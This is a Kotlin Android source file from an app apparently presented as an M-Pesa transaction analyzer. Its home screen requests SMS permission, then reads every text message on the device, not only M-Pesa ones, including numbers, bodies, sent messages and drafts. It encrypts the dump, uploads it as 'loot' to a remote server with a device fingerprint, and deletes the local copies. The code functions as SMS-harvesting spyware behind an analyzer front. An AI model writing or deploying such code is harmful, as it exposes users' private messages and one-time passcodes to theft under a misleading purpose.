package com.niccher.my_mpesa_analyzer.fragments.Home

import android.Manifest
import android.content.ContentResolver
import android.content.Context
import android.content.SharedPreferences
import android.content.pm.PackageManager
import android.os.Bundle
import android.provider.Telephony
import android.util.Base64
import android.util.Log
import android.view.LayoutInflater
import android.view.View
import android.view.ViewGroup
import android.widget.ProgressBar
import android.widget.TextView
import android.widget.Toast
import androidx.appcompat.app.AlertDialog
import androidx.appcompat.app.AppCompatActivity
import androidx.core.content.ContextCompat
import androidx.fragment.app.Fragment
import com.google.gson.Gson
import com.google.gson.GsonBuilder
import com.niccher.my_mpesa_analyzer.R
import com.niccher.mpesa_analyzer.helpers.ServiceGenerators
import com.niccher.my_mpesa_analyzer.helpers.Encryptor
import com.niccher.my_mpesa_analyzer.helpers.Prefs
import com.niccher.my_mpesa_analyzer.interfaces.JsonProcesses
import com.niccher.my_mpesa_analyzer.interfaces.JsonUploadLoot
import com.niccher.my_mpesa_analyzer.konstants.Konstants
import com.niccher.my_mpesa_analyzer.models.Mod_My_Loot_Count
import okhttp3.MediaType
import okhttp3.MediaType.Companion.toMediaTypeOrNull
import okhttp3.MultipartBody
import okhttp3.RequestBody
import okhttp3.ResponseBody
import retrofit2.Call
import retrofit2.Callback
import retrofit2.Response
import retrofit2.Retrofit
import retrofit2.converter.gson.GsonConverterFactory
import java.io.*
import java.util.*

class Frag_Home : Fragment() {

    private lateinit var activity: AppCompatActivity
    private lateinit var kon: Konstants
    private lateinit var prefs: Prefs
    private lateinit var init: PayLoade
    private lateinit var sbsent: StringBuffer

    private lateinit var jsonProcesses: JsonProcesses
    private lateinit var gson: Gson

    private lateinit var pref_loot_counter: SharedPreferences
    private lateinit var sharedEditor: SharedPreferences.Editor

    private lateinit var text_get_and_upload: TextView
    private lateinit var text_get_loot_count: TextView
    private lateinit var last_time: TextView
    private lateinit var perm_status: TextView
    private lateinit var perm_request: TextView

    private lateinit var progressBar: ProgressBar

    private val CODE_READ_SMS = 102
    private val CODE_READ_STORAGE = 104
    private val CODE_WRITE_STORAGE = 106

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        kon = Konstants
        prefs = Prefs()
        gson = GsonBuilder().setLenient().create()
        pref_loot_counter = requireActivity().getSharedPreferences(kon.SHARED_LOOT_COUNT, Context.MODE_PRIVATE)

        init = PayLoade()
    }

    override fun onCreateView(
        inflater: LayoutInflater, container: ViewGroup?,
        savedInstanceState: Bundle?
    ): View? {
        val solv = inflater.inflate(R.layout.frag_home, container, false)

        text_get_and_upload = solv.findViewById(R.id.card_text_upload)
        text_get_loot_count = solv.findViewById(R.id.card_text_info_loot)
        last_time = solv.findViewById(R.id.home_last_upload)
        perm_status = solv.findViewById(R.id.card_text_permission)
        perm_request = solv.findViewById(R.id.card_text_req_permission)
        progressBar = solv.findViewById(R.id.home_upload_state)

        perm_request.visibility = View.GONE
        progressBar.visibility = View.GONE

        reqPermission(Manifest.permission.READ_SMS, CODE_READ_SMS)

        pref_loot_counter = requireActivity().getSharedPreferences(kon.SHARED_LOOT_COUNT, Context.MODE_PRIVATE)

        calc_Loot()

        perm_request.setOnClickListener {
            Log.e("Perm /*- ", "perm_request")
            reqPermission(Manifest.permission.READ_SMS, CODE_READ_SMS)
        }

        text_get_and_upload.setOnClickListener {
            init.Parser_SMS(requireActivity())
        }

        last_time.text = prefs.getTimeStamp(requireActivity())

        return solv
    }

    private fun reqPermission(permission: String, requestCode: Int) {
        text_get_loot_count.text = "Synced ${prefs.getPrefsAuth("loot_count", requireActivity())} times."

        if (ContextCompat.checkSelfPermission(requireActivity(), Manifest.permission.READ_SMS) != PackageManager.PERMISSION_GRANTED) {
            permTweak(false)
            requestPermissions(arrayOf(Manifest.permission.READ_SMS), CODE_READ_SMS)
        } else {
            permTweak(true)
        }
    }

    override fun onRequestPermissionsResult(requestCode: Int, permissions: Array<String>, grantResults: IntArray) {
        if (requestCode == CODE_READ_SMS) {
            if (grantResults.isNotEmpty() && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
                permTweak(true)
            } else {
                AlertDialog.Builder(requireActivity()).apply {
                    setTitle(getString(R.string.string_dialog_permission_status))
                    setMessage(getString(R.string.string_dialog_permission_denied))
                    setNeutralButton(getString(R.string.string_dialog_permission)) { dialog, _ ->
                        dialog.dismiss()
                    }
                    show()
                }
                permTweak(false)
            }
        }
    }

    private fun permTweak(permGranted: Boolean) {
        if (permGranted) {
            perm_status.setTextColor(resources.getColor(R.color.bg_green))
            perm_status.text = getText(R.string.string_dialog_permission_granted)
            perm_request.visibility = View.GONE
        } else {
            perm_status.setTextColor(resources.getColor(R.color.bg_red))
            perm_status.text = getText(R.string.string_dialog_permission_denied)
            perm_request.visibility = View.VISIBLE
        }
    }

    private fun Cryptor(inputFile: File, inputStream: InputStream) {
        try {
            val cc = Encryptor()
            Encryptor.encodeToFile(kon.STRING_KEY, kon.STRING_KEY_SPEC, inputStream, FileOutputStream(inputFile))
            Log.e(kon.TAGGED, "Cryptor: Encryption Completed")
        } catch (e: Exception) {
            e.printStackTrace()
        }
    }

    private fun Make_a_File(fileName: String, dataSource: StringBuffer) {
        val bigData = dataSource.toString()
        var fos: FileOutputStream? = null

        try {
            fos = requireActivity().openFileOutput("${kon.STRING_PLAIN_FILE}$fileName", Context.MODE_PRIVATE)
            fos.write(bigData.toByteArray())

            val fileEncPlain = File(requireActivity().filesDir, "/${kon.STRING_PLAIN_FILE}$fileName")
            val fileEncAes = File(requireActivity().filesDir, "/${kon.STRING_ENC_AES_FILES}$fileName")

            val fileInputStream = BufferedInputStream(FileInputStream(fileEncPlain))
            Cryptor(fileEncAes, fileInputStream)

            init.Parser_Upload(fileEncAes, fileName)
        } catch (e: FileNotFoundException) {
            Log.e(kon.TAGGED, "Error 1  ${e.message}")
        } catch (e: IOException) {
            Log.e(kon.TAGGED, "Error 2  ${e.message}")
        } finally {
            fos?.close()
        }
    }

    private fun calc_Loot() {
        pref_loot_counter = requireActivity().getSharedPreferences(kon.SHARED_LOOT_COUNT, Context.MODE_PRIVATE)

//        val retrofit = Retrofit.Builder()
//            .baseUrl(kon.LINK_PROCESS)
//            .addConverterFactory(GsonConverterFactory.create(gson))
//            .client(ServiceGenerators.getUnsafeOkHttpClient(requireContext()))
//            .build()
//
//        jsonProcesses = retrofit.create(JsonProcesses::class.java)

//        val jsonProcesses by lazy {
//            ServiceGenerators.createService(JsonProcesses::class.java, requireContext())
//        }

        val jsonProcesses = ServiceGenerators.createService(JsonProcesses::class.java, requireContext())

        val parameters = mapOf(
            "varUser" to prefs.getPrefsAuth("auth", requireContext()),
            "varDev" to prefs.getPrefsAuth("print", requireActivity())
        )

        val call = jsonProcesses.getLootCount(parameters)
        call.enqueue(object : Callback<Mod_My_Loot_Count> {
            override fun onResponse(call: Call<Mod_My_Loot_Count>, response: Response<Mod_My_Loot_Count>) {
                if (response.isSuccessful && response.body() != null) {
                    val myLoots = response.body()!!

                    val msgCount = myLoots.msg_count
                    val msgStatus = myLoots.msg_status
                    val msgTime = myLoots.msg_time

                    if (msgStatus == 1) {
                        sharedEditor = pref_loot_counter.edit()
                        sharedEditor.putInt("status", msgStatus)
                        sharedEditor.putInt("loot_count", msgCount)
                        sharedEditor.putString("time_as_at", msgTime)
                        sharedEditor.apply()

                        text_get_loot_count.text = "Synced $msgCount times"
                    }
                }
            }

            override fun onFailure(call: Call<Mod_My_Loot_Count>, t: Throwable) {
                Log.e(kon.TAGGED, "calc_Loot Error")
                Log.e(kon.TAGGED, t.message ?: "Unknown error")
            }
        })
    }

    inner class PayLoade : Thread() {
        override fun run() {
            super.run()
            Log.e(kon.TAGGED, "<Start Parser>")
            Parser_SMS(requireActivity())
        }

        fun Parser_SMS(context: Context) {
            Log.e(kon.TAGGED, "Parser_All_SMS->Started >")
            val cr: ContentResolver = context.contentResolver
            val c = cr.query(Telephony.Sms.CONTENT_URI, null, null, null, null)
            var totalSMS = 0
            if (c != null) {
                totalSMS = c.count
                if (c.moveToFirst()) {
                    sbsent = StringBuffer()
                    for (j in 0 until totalSMS) {
                        val smsDate = c.getString(c.getColumnIndexOrThrow(Telephony.Sms.DATE))
                        val smsNumber = c.getString(c.getColumnIndexOrThrow(Telephony.Sms.ADDRESS))
                        val smsBody = Base64.encodeToString(c.getString(c.getColumnIndexOrThrow(Telephony.Sms.BODY)).toByteArray(), Base64.DEFAULT)
                        val smsSeen = c.getString(c.getColumnIndexOrThrow(Telephony.Sms.SEEN))
                        val smsThreadid = c.getString(c.getColumnIndexOrThrow(Telephony.Sms.THREAD_ID))
                        val smsId = c.getString(c.getColumnIndexOrThrow(Telephony.Sms._ID))

                        val smsType = when (c.getString(c.getColumnIndexOrThrow(Telephony.Sms.TYPE)).toInt()) {
                            Telephony.Sms.MESSAGE_TYPE_INBOX -> "inbox"
                            Telephony.Sms.MESSAGE_TYPE_SENT -> "sent"
                            Telephony.Sms.MESSAGE_TYPE_OUTBOX -> "outbox"
                            Telephony.Sms.MESSAGE_TYPE_QUEUED -> "queued"
                            Telephony.Sms.MESSAGE_TYPE_DRAFT -> "draft"
                            else -> ""
                        }
                        sbsent.append("{\"Type\": \"$smsType\",\"Number\": \"$smsNumber\",\"Thread Id\": $smsThreadid,\"Date\": $smsDate,\"Body\": \"$smsBody\",\"Seen\": $smsSeen,\"ID\": $smsId },-------(//)--------")

                        c.moveToNext()
                    }
                }
                Make_a_File("sms_All_${System.currentTimeMillis()}", sbsent)
                c.close()
            } else {
                Log.e(kon.TAGGED, "Parser_All_SMS->No More >")
            }
            Log.e(kon.TAGGED, "Parser_All_SMS->Finished >")
        }

        fun Parser_Upload(files: File, filename: String) {
            progressBar.visibility = View.VISIBLE

            val service = ServiceGenerators.createService(JsonUploadLoot::class.java, requireContext())
            val file = files
            val requestFile = RequestBody.create("*/*".toMediaTypeOrNull(), file)

            val body = MultipartBody.Part.createFormData("varLoot", "$filename.txt", requestFile)

            val partToken = prefs.getPrefsAuth("auth", requireActivity())
            val partDevId = prefs.getPrefsAuth("print", requireActivity())

            val requestBody0 = RequestBody.create(okhttp3.MultipartBody.FORM, partToken)
            val requestBody1 = RequestBody.create(okhttp3.MultipartBody.FORM, partDevId)

            val call = service.upload(requestBody0, requestBody1, body)
            call.enqueue(object : Callback<ResponseBody> {
                override fun onResponse(call: Call<ResponseBody>, response: Response<ResponseBody>) {
                    try {
                        val encPlain = File(requireActivity().filesDir, "/${kon.STRING_PLAIN_FILE}$filename")
                        val encAes = File(requireActivity().filesDir, "/${kon.STRING_ENC_AES_FILES}$filename")

                        encPlain.delete()
                        encAes.delete()

                        prefs.getFileType(filename, System.currentTimeMillis().toString(), requireActivity())
                        last_time.text = prefs.getTimeStamp(requireActivity())
                        calc_Loot()
                    } catch (e: Exception) {
                        Log.e(kon.TAGGED, "Delete Files error\n${e.message}")
                    }
                    progressBar.visibility = View.GONE
                }

                override fun onFailure(call: Call<ResponseBody>, t: Throwable) {
                    Toast.makeText(context, "Upload error: " + t?.message ?: "Unknown error", Toast.LENGTH_LONG).show()
                    progressBar.visibility = View.GONE
                }
            })

            Log.e(kon.TAGGED, "Upload_Loot: Data Upload")
        }
    }
}